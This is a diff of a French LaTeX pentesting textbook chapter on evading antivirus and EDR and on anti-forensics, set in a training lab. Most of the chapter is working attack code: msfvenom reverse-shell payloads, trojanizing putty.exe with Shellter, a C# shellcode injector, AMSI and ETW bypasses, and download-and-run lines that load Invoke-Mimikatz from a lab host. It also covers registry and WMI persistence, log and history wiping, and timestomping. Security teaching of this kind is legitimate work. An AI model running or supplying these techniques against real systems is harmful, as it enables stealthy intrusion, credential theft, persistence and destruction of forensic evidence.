@@ -1,121 +1,660 @@
 % ==============================================================================
-% Fichier : 07_evasion_antiforensic.tex
-% Description : Évasion des Défenses et Anti-Forensics
+% Fichier     : chapitres/07_evasion_antiforensic.tex
+% Titre       : Évasion des Défenses et Anti-Forensics
+% Auteur      : MINKA MI NGUIDJOÏ Thierry Emmanuel
 % ==============================================================================
 
 \chapter{Évasion des Défenses et Anti-Forensics}
+\label{chap:evasion}
 
-Les outils d'attaque standards (comme Metasploit ou Mimikatz) sont connus de tous les éditeurs d'antivirus (AV) et des systèmes de détection (EDR). Pour réussir un Pentest avancé, il est impératif de savoir rendre ses outils indétectables et de nettoyer ses traces.
+Les outils d'attaque standards, Metasploit, Mimikatz, BloodHound, sont
+connus de tous les éditeurs d'antivirus (\sigle{AV}) et des systèmes de
+détection comportementale (\sigle{EDR}). Pour réussir un pentest avancé
+simulant un attaquant réel, il faut savoir \textbf{rendre les outils
+indétectables} et \textbf{effacer les traces} de passage. Ce chapitre
+présente les techniques d'évasion et d'anti-forensics utilisées par les
+attaquants sophistiqués, et que les défenseurs doivent impérativement
+comprendre pour déployer des contre-mesures efficaces.
 
-\section{Évasion des Antivirus et EDR}
-% ------------------------------------------------------------------------------
+\begin{boxalert}
+\textbf{Avertissement éthique :} Les techniques présentées dans ce chapitre
+sont des outils de compréhension défensive. Toute application hors du
+laboratoire isolé ou sans mandat écrit constitue une infraction pénale
+(Chapitre~\ref{chap:juridique}). En pentest réel, les techniques de
+nettoyage de logs doivent être \textbf{documentées} dans le rapport
+plutôt qu'exécutées, sauf accord client explicite.
+\end{boxalert}
 
-L'objectif est d'exécuter du code malveillant sans être bloqué ou signalé.
+\begin{boxinfo}
+\textbf{MITRE ATT\&CK, Tactique associée :}
+Ce chapitre couvre \sigle{TA0005} (\textit{Defense Evasion}), notamment
+T1027 (\textit{Obfuscated Files}), T1055 (\textit{Process Injection}),
+T1562 (\textit{Impair Defenses}), T1070 (\textit{Indicator Removal}),
+T1140 (\textit{Deobfuscate/Decode Files}).
+\end{boxinfo}
 
-\subsection{Principes de Détection}
+% ==============================================================================
+\section{Architecture des Défenses Modernes}
+\label{sec:defense_architecture}
+% ==============================================================================
 
-Les défenses utilisent principalement deux méthodes :
-\begin{itemize}
-    \item \textbf{Détection Statique (Signature) :} Analyse le fichier pour rechercher des séquences d'octets connues (signatures).
-    \item \textbf{Détection Comportementale (Heuristique) :} Analyse le comportement du programme lors de l'exécution (ex: tentative de dump de la mémoire LSASS).
-\end{itemize}
+Avant d'aborder les techniques d'évasion, il est indispensable de comprendre
+l'architecture des défenses que l'on cherche à contourner.
 
-\subsection{Techniques d'Obfuscation}
+\subsection{Antivirus (AV) vs EDR}
+\label{subsec:av_vs_edr}
 
-Pour contourner la détection statique, il faut modifier le code sans changer sa fonction.
-
-\begin{itemize}
-    \item \textbf{Encodage :} Utiliser des encodages simples (Base64, XOR, Shikata Ga Nai).
-    \item \textbf{Packing :} Compresser et chiffrer l'exécutable. Le fichier infecté a une signature différente à chaque "pack".
-    \item \textbf{Custom Payloads :} Écrire son propre code (C, C#, Python compilé) au lieu d'utiliser des payloads publics.
-\end{itemize}
-
-\begin{lstlisting}[language=bash, caption=Génération de payload indétectable avec Msfvenom]
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > backdoor.exe
-# -e : encodeur
-# -i : nombre d'iterations (plus c'est haut, plus c'est dur a analyser)
-\end{lstlisting}
-
-\subsection{Living Off The Land (LotL)}
-
-Technique visant à utiliser les outils légitimes présents par défaut dans le système d'exploitation pour réaliser l'attaque. Comme ces outils sont signés par Microsoft, ils sont souvent "autorisés" par l'antivirus.
-
-\begin{table}[h!]
+\begin{table}[htbp]
 \centering
-\small
-\begin{tabular}{p{3cm}p{5cm}p{4cm}}
-    \toprule
-    \textbf{Outil (LoLBin)} & \textbf{Usage Légitime} & \textbf{Usage Malveillant} \\
-    \midrule
-    \textbf{Certutil} & Gestion certificats. & Téléchargement de fichiers (remplace wget/curl). \\
-    \textbf{Mshta} & Exécution d'applications HTML. & Exécution de scripts malveillants (HTA) sans fichier EXE. \\
-    \textbf{Regsvr32} & Enregistrement DLL. & Exécution de code distant via scriptlets. \\
-    \textbf{Powershell} & Administration. & Exécution de payloads en mémoire (Fileless). \\
-    \bottomrule
+\caption{Comparatif AV classique vs EDR moderne}
+\label{tab:av_vs_edr}
+\begin{tabular}{p{3cm}p{5.5cm}p{5cm}}
+\toprule
+\textbf{Critère} & \textbf{AV Classique} & \textbf{EDR Moderne} \\
+\midrule
+Détection
+    & Signatures statiques (hash de fichiers, patterns d'octets)
+    & Comportement en temps réel + ML + signatures + corrélation \\
+\addlinespace
+Visibilité
+    & Fichiers sur disque uniquement
+    & Processus, mémoire, réseau, registre, appels système \\
+\addlinespace
+Réponse
+    & Quarantaine du fichier
+    & Isolation de la machine, kill process, rollback \\
+\addlinespace
+Contournement
+    & Obfuscation, encodage, packing
+    & Beaucoup plus difficile, nécessite contournement des hooks kernel \\
+\addlinespace
+Exemples
+    & Windows Defender (mode basique), Avast, AVG
+    & CrowdStrike Falcon, SentinelOne, Carbon Black, Defender ATP \\
+\bottomrule
 \end{tabular}
-\caption{Exemples de Living Off The Land Binaries}
 \end{table}
 
-\begin{boxlizbiz}
-\textbf{Cas LiZbiZ :}
-Au lieu de déposer un fichier \texttt{mimikatz.exe} sur le disque (qui serait détecté), l'attaquant utilise un script PowerShell qui charge Mimikatz directement depuis la mémoire vive (Reflective Injection), sans jamais écrire de fichier sur le disque dur.
-\end{boxlizbiz}
-
-\subsection{Bypass AMSI (Antimalware Scan Interface)}
-
-AMSI est une interface Windows qui permet à l'antivirus de scanner le contenu des scripts (PowerShell, VBScript) avant exécution. Le contourner est souvent nécessaire pour utiliser PowerShell.
-
-\begin{lstlisting}[language=PowerShell, caption=Exemple de bypass AMSI simple]
-# Desactive la protection AMSI pour la session en cours
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-\end{lstlisting}
-
-% ------------------------------------------------------------------------------
-\section{Anti-Forensics : Effacer ses Traces}
-% ------------------------------------------------------------------------------
-
-Une fois l'objectif atteint (démonstration de l'impact), le pentester doit nettoyer l'environnement pour restaurer son état initial et ne pas laisser de portes ouvertes (Backdoors), sauf si le mandat le prévoit.
-
-\subsection{Nettoyage des Logs (Event Logs)}
-
-Windows journalise toutes les actions dans l'Observateur d'événements.
+\subsection{Mécanismes de Détection}
+\label{subsec:detection_mechanisms}
 
 \begin{itemize}
-    \item \textbf{Logs de Sécurité :} Connexions, créations de comptes, accès aux objets.
-    \item \textbf{Logs Système :} Installation de services, démarrage/arrêt.
+    \item \textbf{Détection statique (signature) :} Analyse du fichier au repos —
+          recherche de séquences d'octets connues (\textit{byte patterns}),
+          hashes de fichiers malveillants connus (\sigle{IOC}).
+    \item \textbf{Détection comportementale (heuristique) :} Analyse du
+          comportement à l'exécution, accès à \sigle{LSASS}, injection dans
+          d'autres processus, connexions réseau suspectes, modifications du
+          registre.
+    \item \textbf{Hooks \textit{userland} :} L'\sigle{EDR} injecte une \sigle{DLL}
+          dans chaque processus et \textit{hooké} les fonctions \sigle{API}
+          Windows sensibles (ex.~: \texttt{NtCreateThread},
+          \texttt{ReadProcessMemory}) pour intercepter les appels suspects.
+    \item \textbf{ETW (\textit{Event Tracing for Windows}) :} Infrastructure
+          de journalisation kernel interceptant les appels système et les
+          événements de sécurité, utilisée par les \sigle{EDR} pour
+          corréler les actions.
+    \item \textbf{AMSI (\textit{Antimalware Scan Interface}) :} Interface
+          permettant aux \sigle{AV} de scanner le contenu des scripts
+          (PowerShell, VBScript, JScript) \textit{avant} exécution.
 \end{itemize}
 
-\begin{lstlisting}[language=bash, caption=Effacement des logs avec wevtutil]
-# Effacer le journal de securite (Action tres bruyante en soit)
+% ==============================================================================
+\section{Obfuscation et Génération de Payloads}
+\label{sec:obfuscation}
+% ==============================================================================
+
+\subsection{Msfvenom avec Encodage}
+\label{subsec:msfvenom}
+
+\begin{lstlisting}[language=bash, caption={Msfvenom, génération de payload obfusqué}]
+# Payload Windows 64 bits avec encodeur shikata_ga_nai (5 itérations)
+# IMPORTANT : payload windows/x64 pour cible 64 bits
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+         LHOST=10.10.10.100 LPORT=4444 \
+         -e x64/xor_dynamic -i 5 \
+         -f exe -o payload_x64.exe
+
+# Générer en format C (pour intégration dans du code custom)
+msfvenom -p windows/x64/shell_reverse_tcp \
+         LHOST=10.10.10.100 LPORT=4444 \
+         -f c -o shellcode.c
+
+# Format PowerShell (injection en mémoire)
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+         LHOST=10.10.10.100 LPORT=4444 \
+         -f ps1 -o payload.ps1
+\end{lstlisting}
+
+\begin{boxinfo}
+\textbf{Limites de l'encodage Msfvenom :} Les encodeurs Msfvenom
+(\textit{shikata\_ga\_nai}, \textit{xor\_dynamic}) sont bien connus des
+éditeurs \sigle{AV}, leur efficacité contre les \sigle{AV} modernes
+est faible. Ils restent utiles pour les systèmes non mis à jour ou pour
+démontrer le concept. Pour un contournement efficace, les techniques
+présentées dans les subsections suivantes sont nécessaires.
+\end{boxinfo}
+
+\subsection{Shellter, Injection dans des Binaires Légitimes}
+\label{subsec:shellter}
+
+\termecle{Shellter} injecte du shellcode dans un exécutable Windows
+\textit{légitime} (ex.~: \texttt{putty.exe}, \texttt{vlc.exe}), en
+modifiant le flux d'exécution de façon dynamique. Le fichier résultant
+conserve sa signature et son comportement apparents.
+
+\begin{lstlisting}[language=bash, caption={Shellter, injection dans un binaire légitime}]
+# Installation (Kali Linux)
+apt install shellter -y
+
+# Mode auto : Shellter choisit automatiquement le point d'injection
+shellter
+# Choisir : A (Automatic mode)
+# PE Target : /tmp/putty.exe   (binaire légitime 32 bits)
+# Stealth mode : Y
+# Payload : L (Listed) → 1 (Meterpreter_Reverse_TCP)
+# LHOST : 10.10.10.100
+# LPORT : 4444
+
+# Résultat : putty.exe modifié, se comporte normalement ET déclenche
+# un reverse shell Meterpreter à l'exécution
+\end{lstlisting}
+
+\subsection{Payloads Custom, C\# et Nim}
+\label{subsec:custom_payloads}
+
+Écrire son propre code d'injection est la technique la plus efficace pour
+contourner les \sigle{AV}, un payload custom ne correspond à aucune
+signature connue.
+
+\begin{lstlisting}[language=csh, caption={Injection de shellcode en C\#, template de base}]
+// Template C# minimal pour injection de shellcode en mémoire
+// Compile avec : csc.exe /unsafe payload.cs
+using System;
+using System.Runtime.InteropServices;
+
+class Injector {
+    [DllImport("kernel32")]
+    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+        uint flAllocationType, uint flProtect);
+    [DllImport("kernel32")]
+    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
+        uint flNewProtect, out uint lpflOldProtect);
+    [DllImport("kernel32")]
+    static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+        uint dwStackSize, IntPtr lpStartAddress,
+        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    [DllImport("kernel32")]
+    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 ms);
+
+    static void Main() {
+        // Shellcode généré avec msfvenom -f csharp
+        byte[] shellcode = new byte[] { 0xfc, 0x48, ... };
+
+        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
+            0x3000, 0x40);
+        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
+        IntPtr thread = CreateThread(IntPtr.Zero, 0, addr,
+            IntPtr.Zero, 0, IntPtr.Zero);
+        WaitForSingleObject(thread, 0xFFFFFFFF);
+    }
+}
+\end{lstlisting}
+
+\subsection{Donut, Shellcode depuis des Assemblies .NET}
+\label{subsec:donut}
+
+\termecle{Donut} convertit des assemblies .NET (Mimikatz.NET, BloodHound,
+SharpHound) en shellcode injectable en mémoire, contournant ainsi la
+détection basée sur les noms de fichiers.
+
+\begin{lstlisting}[language=bash, caption={Donut, conversion assembly .NET en shellcode}]
+# Convertir SharpHound.exe en shellcode injectable
+./donut -a 2 -f 7 \
+        -i SharpHound.exe \
+        -p "-c All --domain lizbiz.local" \
+        -o sharphound_shellcode.bin
+
+# Injecter le shellcode avec un loader custom (C# ou Nim)
+# Le binaire SharpHound ne touche jamais le disque
+\end{lstlisting}
+
+% ==============================================================================
+\section{Bypass AMSI et ETW}
+\label{sec:amsi_bypass}
+% ==============================================================================
+
+\subsection{AMSI (\textit{Antimalware Scan Interface})}
+\label{subsec:amsi}
+
+\sigle{AMSI} est une interface Windows qui transmet le contenu des scripts
+PowerShell, VBScript et JScript à l'\sigle{AV} avant exécution. Son
+contournement est nécessaire dès qu'on utilise PowerShell offensif.
+
+\begin{lstlisting}[language=PowerShell, caption={Techniques de bypass AMSI, du simple au robuste}]
+# ── Technique 1 : Patch de la fonction AmsiScanBuffer en mémoire ──────
+# (la plus courante, patche l'AMSI dans le processus PowerShell courant)
+$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$b=$a.GetField('amsiInitFailed','NonPublic,Static')
+$b.SetValue($null,$true)
+
+# ── Technique 2 : Forcer l'erreur d'initialisation AMSI ──────────────
+[Runtime.InteropServices.Marshal]::WriteByte(
+    (Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h, string n);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);' -Name W -PassThru)::GetProcAddress(([W]::LoadLibrary("amsi")), "AmsiScanBuffer"),
+    0xB8   # Opcode ret direct (nop le scan)
+)
+
+# ── Technique 3 : Obfuscation via chaîne concaténée ───────────────────
+# Contourne la détection statique des bypass connus
+$s = 'Am'+'si'+'Utils'
+$t = [Ref].Assembly.GetType("System.Management.Automation.$s")
+$u = $t.GetField('amsi'+'Init'+'Failed','NonPublic,Static')
+$u.SetValue($null,$true)
+\end{lstlisting}
+
+\subsection{ETW (\textit{Event Tracing for Windows}) Patching}
+\label{subsec:etw}
+
+\sigle{ETW} fournit aux \sigle{EDR} une visibilité sur les appels système.
+Le patching d'ETW aveugle temporairement la télémétrie de l'\sigle{EDR}.
+
+\begin{lstlisting}[language=PowerShell, caption={ETW Patching, désactivation de la télémétrie PowerShell}]
+# Patcher EtwEventWrite pour renvoyer SUCCESS sans loguer
+$a=[Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider')
+$b=$a.GetField('m_etwProvider','NonPublic,Instance')
+$c=$b.GetValue([Ref].Assembly.GetType(
+    'System.Management.Automation.Tracing.PSEtwLogProvider').GetField(
+    'etwProvider','NonPublic,Static').GetValue($null))
+[System.Runtime.InteropServices.Marshal]::WriteInt64(
+    $c.m_regHandle,0)
+\end{lstlisting}
+
+% ==============================================================================
+\section{Living Off The Land (LotL)}
+\label{sec:lotl}
+% ==============================================================================
+
+La technique \termecle{LotL} (\textit{Living Off The Land}) consiste à utiliser
+des outils légitimes présents par défaut dans le système pour réaliser des
+actions offensives. Ces binaires sont signés par Microsoft et généralement
+autorisés par les \sigle{AV}. \textbf{MITRE T1218.}
+
+\begin{table}[htbp]
+\centering
+\caption{Living Off The Land Binaries (LoLBins), usages offensifs}
+\label{tab:lolbins}
+\begin{tabular}{p{2.5cm}p{3.8cm}p{6.5cm}}
+\toprule
+\textbf{Outil} & \textbf{Usage légitime} & \textbf{Usage offensif} \\
+\midrule
+\texttt{certutil.exe}
+    & Gestion de certificats
+    & Téléchargement de fichiers (\texttt{-urlcache -split -f}) \\
+\addlinespace
+\texttt{mshta.exe}
+    & Exécution d'applications HTML
+    & Exécution de scripts \sigle{HTA} malveillants sans \sigle{EXE} \\
+\addlinespace
+\texttt{regsvr32.exe}
+    & Enregistrement de DLL
+    & Exécution de code distant via \textit{scriptlets} \sigle{COM} \\
+\addlinespace
+\texttt{powershell.exe}
+    & Administration système
+    & Exécution de payloads en mémoire, bypass \sigle{AMSI} \\
+\addlinespace
+\texttt{wmic.exe}
+    & Gestion \sigle{WMI}
+    & Exécution de commandes à distance, persistance via \sigle{WMI} \\
+\addlinespace
+\texttt{bitsadmin.exe}
+    & Transferts en arrière-plan
+    & Téléchargement de fichiers malveillants \\
+\addlinespace
+\texttt{rundll32.exe}
+    & Exécution de fonctions DLL
+    & Exécution de shellcode via DLL custom \\
+\addlinespace
+\texttt{msiexec.exe}
+    & Installation de packages MSI
+    & Exécution de MSI malveillant (\textit{AlwaysInstallElevated}) \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\begin{lstlisting}[language=PowerShell, caption={LotL, exemples opérationnels}]
+# Téléchargement via certutil (contourne les proxies web basiques)
+certutil -urlcache -split -f http://10.10.10.100:8080/payload.exe C:\Temp\p.exe
+
+# Exécution de code distant via regsvr32 (Squiblydoo)
+regsvr32 /s /n /u /i:http://10.10.10.100:8080/malicious.sct scrobj.dll
+
+# Injection de code en mémoire via PowerShell (sans fichier sur disque)
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand \
+           [BASE64_ENCODED_COMMAND]
+
+# Chargement de Mimikatz en mémoire (sans toucher le disque)
+powershell "IEX (New-Object Net.WebClient).DownloadString(\
+    'http://10.10.10.100:8080/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
+\end{lstlisting}
+
+\begin{boxlizbiz}
+\textbf{Cas LiZbiZ, Mimikatz fileless :}
+Au lieu de déposer \texttt{mimikatz.exe} sur le disque (détecté immédiatement
+par Windows Defender), l'attaquant charge Invoke-Mimikatz directement en
+mémoire via PowerShell après bypass AMSI. Aucun fichier n'est écrit sur le
+disque dur, le \sigle{AV} basé sur les signatures de fichiers est aveugle.
+
+\begin{lstlisting}[language=PowerShell]
+# Étape 1 : Bypass AMSI
+$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$b=$a.GetField('amsiInitFailed','NonPublic,Static')
+$b.SetValue($null,$true)
+
+# Étape 2 : Charger Mimikatz en mémoire
+IEX (New-Object Net.WebClient).DownloadString(
+    'http://10.10.10.100:8080/Invoke-Mimikatz.ps1')
+
+# Étape 3 : Exécuter
+Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
+\end{lstlisting}
+\textbf{MITRE :} T1059.001 (\textit{PowerShell}), T1218 (LoLBins).
+\end{boxlizbiz}
+
+% ==============================================================================
+\section{Attaques Fileless (Sans Fichier)}
+\label{sec:fileless}
+% ==============================================================================
+
+Les attaques \termecle{fileless} ne déposent aucun fichier sur le disque —
+le code malveillant réside uniquement en mémoire vive, dans le registre,
+ou dans des mécanismes de persistance \sigle{WMI}. \textbf{MITRE T1027.}
+
+\subsection{Injection de Processus}
+\label{subsec:process_injection}
+
+\begin{lstlisting}[language=PowerShell, caption={Process Injection, shellcode dans un processus légitime}]
+# Injection dans un processus légitime (ex : notepad.exe)
+# via les API Windows VirtualAllocEx / WriteProcessMemory / CreateRemoteThread
+
+# PowerShell, injection via P/Invoke
+$notepad = Start-Process notepad -PassThru
+$handle = [Kernel32]::OpenProcess(0x1F0FFF, $false, $notepad.Id)
+
+# Allouer de la mémoire dans le processus cible
+$addr = [Kernel32]::VirtualAllocEx($handle, [IntPtr]::Zero,
+    $shellcode.Length, 0x3000, 0x40)
+
+# Écrire le shellcode
+[Kernel32]::WriteProcessMemory($handle, $addr, $shellcode,
+    $shellcode.Length, [ref]0)
+
+# Créer un thread distant exécutant le shellcode
+[Kernel32]::CreateRemoteThread($handle, [IntPtr]::Zero, 0,
+    $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+\end{lstlisting}
+
+\subsection{Persistance Fileless via le Registre}
+\label{subsec:registry_fileless}
+
+\begin{lstlisting}[language=PowerShell, caption={Persistance fileless via le registre Windows}]
+# Stocker le payload PowerShell encodé dans le registre
+$payload = "powershell -WindowStyle Hidden -EncodedCommand [B64_PAYLOAD]"
+
+# Clé de démarrage automatique (Run)
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" \
+    -Name "WindowsUpdate" -Value $payload
+
+# Alternative plus discrète : RunOnce (s'exécute une fois au démarrage)
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" \
+    -Name "SecurityScan" -Value $payload
+\end{lstlisting}
+
+\subsection{Persistance via WMI Event Subscription}
+\label{subsec:wmi_persistence}
+
+La persistance via \sigle{WMI} est extrêmement discrète car elle n'ajoute
+aucune entrée visible dans les programmes de démarrage.
+
+\begin{lstlisting}[language=PowerShell, caption={WMI Event Subscription, persistance sans fichier}]
+# Créer un filtre d'événement (déclencheur : 60 secondes après démarrage)
+$filter = Set-WmiInstance -Namespace root\subscription \
+    -Class __EventFilter \
+    -Arguments @{
+        Name="WindowsDefenderUpdate"
+        EventNameSpace="root\cimv2"
+        QueryLanguage="WQL"
+        Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE
+               TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
+               AND TargetInstance.SystemUpTime >= 60"
+    }
+
+# Créer un consommateur (action : exécuter le payload)
+$consumer = Set-WmiInstance -Namespace root\subscription \
+    -Class CommandLineEventConsumer \
+    -Arguments @{
+        Name="WindowsDefenderUpdate"
+        CommandLineTemplate="powershell -EncodedCommand [B64_PAYLOAD]"
+    }
+
+# Lier le filtre au consommateur
+Set-WmiInstance -Namespace root\subscription \
+    -Class __FilterToConsumerBinding \
+    -Arguments @{Filter=$filter; Consumer=$consumer}
+\end{lstlisting}
+
+% ==============================================================================
+\section{Anti-Forensics : Effacer ses Traces}
+\label{sec:antiforensics}
+% ==============================================================================
+
+Une fois l'objectif démontré, le pentester doit nettoyer les artéfacts laissés
+— ou documenter dans le rapport ce qu'il \textit{aurait pu} nettoyer.
+
+\subsection{Nettoyage des Journaux Windows}
+\label{subsec:log_clearing}
+
+\begin{lstlisting}[language=PowerShell, caption={Nettoyage des journaux Windows}]
+# Effacer tous les journaux Windows (action bruyante, Event ID 1102)
+wevtutil el | foreach { wevtutil cl $_ }
+
+# Effacer uniquement les journaux de sécurité et système
 wevtutil cl Security
+wevtutil cl System
+wevtutil cl "Windows PowerShell"
+wevtutil cl "Microsoft-Windows-PowerShell/Operational"
+
+# Supprimer les logs Sysmon (si installé)
+wevtutil cl "Microsoft-Windows-Sysmon/Operational"
 \end{lstlisting}
 
 \begin{boxalert}
-\textbf{Attention Opérationnelle :} Effacer les logs est une preuve de culpabilité évidente en cas d'incident réel. En Pentest, cette action doit être réalisée avec parcimonie ou simulée (indiquer dans le rapport : "Nous aurions pu effacer les logs").
+\textbf{Attention opérationnelle :} Effacer les journaux génère
+l'événement \textbf{Event ID~1102} (Security log cleared) ou
+\textbf{Event ID~104} (System log cleared), paradoxalement, c'est
+une preuve de compromission évidente pour les analystes SOC. En pentest,
+documenter \og{}nous aurions pu effacer les logs\fg{} est préférable
+à les effacer réellement, sauf accord contractuel explicite.
 \end{boxalert}
 
 \subsection{Timestomping}
+\label{subsec:timestomping}
 
-Technique consistant à modifier les métadonnées temporelles d'un fichier pour qu'il semble avoir été créé ou modifié bien avant l'attaque, perturbant l'analyse forensique.
+Modification des horodatages \sigle{MACE} (\textit{Modified, Accessed,
+Created, Entry Modified}) pour perturber la chronologie forensique.
 
-\begin{lstlisting}[language=bash, caption=Timestomping sous Linux]
+\begin{lstlisting}[language=bash, caption={Timestomping, Linux et Windows}]
+# ── LINUX ─────────────────────────────────────────────────────────────
+# Modifier mtime et atime d'un fichier
 touch -t 202201010000 backdoor.sh
-# Change la date du fichier au 01/01/2022 minuit
+# Copier les timestamps d'un fichier légitime
+touch -r /bin/ls backdoor.sh
+
+# ── WINDOWS (Meterpreter) ─────────────────────────────────────────────
+meterpreter > timestomp C:\Temp\payload.exe -z
+# -z : zéroiser tous les timestamps
+
+meterpreter > timestomp C:\Temp\payload.exe -f C:\Windows\System32\calc.exe
+# -f : copier les timestamps d'un fichier légitime
+
+# ── WINDOWS (PowerShell) ──────────────────────────────────────────────
+$file = Get-Item "C:\Temp\payload.exe"
+$file.LastWriteTime  = [datetime]"2022-01-15 10:30:00"
+$file.LastAccessTime = [datetime]"2022-01-15 10:30:00"
+$file.CreationTime   = [datetime]"2022-01-15 10:30:00"
 \end{lstlisting}
 
 \subsection{Suppression des Artefacts d'Exécution}
+\label{subsec:artifacts}
 
-\begin{itemize}
-    \item Supprimer les fichiers temporaires (\texttt{\%TEMP\%}).
-    \item Vider l'historique PowerShell (\texttt{Clear-History}).
-    \item Supprimer les entrées de Registre créées pour la persistance.
-    \item Restaurer la configuration du pare-feu.
-\end{itemize}
+\begin{lstlisting}[language=PowerShell, caption={Nettoyage complet des artefacts Windows}]
+# Historique PowerShell
+Clear-History
+Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
 
-% ------------------------------------------------------------------------------
-\section{Attaques "Fileless" (Sans Fichier)}
-% ------------------------------------------------------------------------------
+# Fichiers temporaires
+Remove-Item -Recurse -Force $env:TEMP\* -ErrorAction SilentlyContinue
+Remove-Item -Recurse -Force "C:\Windows\Temp\*" -ErrorAction SilentlyContinue
 
-Technique ultime d'évasion. Le code malveillant ne réside que dans la mémoire RAM (ou le Registre). Au redémarrage de la machine, l'infection disparaît. Très difficile à détecter par les scans de disque.
+# Prefetch (traces d'exécution de programmes, nécessite droits admin)
+Remove-Item C:\Windows\Prefetch\MIMIKATZ*.pf -ErrorAction SilentlyContinue
 
-\textbf{Exemple :} Un script PowerShell injecté directement en mémoire via une vulnérabilité web, qui tente de se connecter au contrôleur de domaine.
+# Entrées de registre de persistance
+Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" \
+    -Name "WindowsUpdate" -ErrorAction SilentlyContinue
+
+# Recent files (MRU, Most Recently Used)
+Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" \
+    -Recurse -ErrorAction SilentlyContinue
+\end{lstlisting}
+
+\begin{lstlisting}[language=bash, caption={Nettoyage des artefacts Linux}]
+# Historique shell
+history -c && history -w
+unset HISTFILE
+echo "" > ~/.bash_history
+rm -f ~/.bash_history ~/.zsh_history
+
+# Logs système (nécessite root)
+echo "" > /var/log/auth.log
+echo "" > /var/log/syslog
+echo "" > /var/log/apache2/access.log
+echo "" > /var/log/apache2/error.log
+
+# Supprimer les fichiers temporaires déposés
+rm -f /tmp/linpeas.sh /tmp/chisel /tmp/.lp.sh
+
+# Effacer les traces dans les logs wtmp/btmp (connexions SSH)
+utmpdump /var/log/wtmp | grep -v "ATTACKER_IP" | \
+    utmpdump -r > /tmp/wtmp.clean
+mv /tmp/wtmp.clean /var/log/wtmp
+\end{lstlisting}
+
+% ==============================================================================
+\section{Synthèse : Tableau de Bord Évasion LiZbiZ}
+\label{sec:synthese_evasion}
+% ==============================================================================
+
+\begin{table}[htbp]
+\centering
+\caption{Synthèse des techniques d'évasion, LiZbiZ}
+\label{tab:synthese_evasion}
+\begin{tabular}{p{3cm}p{3.5cm}p{3cm}p{4cm}}
+\toprule
+\textbf{Technique} & \textbf{Objectif} & \textbf{MITRE} & \textbf{Contre-mesure} \\
+\midrule
+AMSI Bypass
+    & Exécuter PowerShell offensif
+    & T1562.001
+    & AMSI providers tiers, Constrained Language Mode \\
+\addlinespace
+LotL / Certutil
+    & Télécharger sans AV
+    & T1218
+    & Surveillance des LoLBins, AppLocker \\
+\addlinespace
+Invoke-Mimikatz
+    & Credential dump sans fichier
+    & T1059.001
+    & Credential Guard, PPL pour LSASS \\
+\addlinespace
+Process Injection
+    & Masquer le code malveillant
+    & T1055
+    & Surveillance API CreateRemoteThread \\
+\addlinespace
+WMI Persistence
+    & Persistance invisible
+    & T1546.003
+    & Surveillance WMI subscriptions \\
+\addlinespace
+Timestomping
+    & Perturber la forensique
+    & T1070.006
+    & \$MFT (NTFS journal), logs Sysmon \\
+\addlinespace
+Log Clearing
+    & Effacer les traces
+    & T1070.001
+    & SIEM externe, forwarding immédiat \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+% ==============================================================================
+\section*{Points Clés à Retenir}
+% ==============================================================================
+
+\begin{boxinfo}
+\textbf{Ce qu'il faut retenir de ce chapitre :}
+\begin{enumerate}
+    \item Les \sigle{EDR} modernes voient \textbf{bien plus} que les \sigle{AV}
+          classiques, contourner un \sigle{EDR} requiert le bypass des
+          hooks userland et d'\sigle{ETW}.
+    \item \textbf{AMSI} doit être bypassé avant tout usage de PowerShell
+          offensif, plusieurs techniques existent selon le niveau de
+          détection.
+    \item Les \textbf{LoLBins} sont souvent sous-surveillés, les SOC
+          oublient que certutil et regsvr32 peuvent télécharger et exécuter
+          du code.
+    \item Les \textbf{attaques fileless} ne laissent aucune trace sur disque
+         , seule une surveillance mémoire et comportementale les détecte.
+    \item \textbf{Effacer les logs génère un événement} (ID~1102/104) —
+          documenter dans le rapport plutôt qu'exécuter en conditions réelles.
+    \item Le \textbf{timestomping} ne résiste pas à l'analyse du journal
+          \sigle{NTFS} (\texttt{\$MFT}), les horodatages \sigle{MFT}
+          ne sont pas modifiés par \texttt{touch}/Meterpreter.
+\end{enumerate}
+\end{boxinfo}
+
+% ==============================================================================
+\section*{Exercice Pratique}
+% ==============================================================================
+
+\begin{boxexo}
+\textbf{Exercice 7.1, Bypass AMSI et Invoke-Mimikatz fileless}
+
+\medskip
+\textbf{Cible :} VM Windows Server 2019 du lab LiZbiZ.
+
+\medskip
+\textbf{Tâches :}
+\begin{enumerate}
+    \item Tenter de lancer \texttt{Invoke-Mimikatz} directement dans
+          PowerShell, observer le blocage AMSI.
+    \item Appliquer la technique de bypass AMSI par patch de
+          \texttt{amsiInitFailed}.
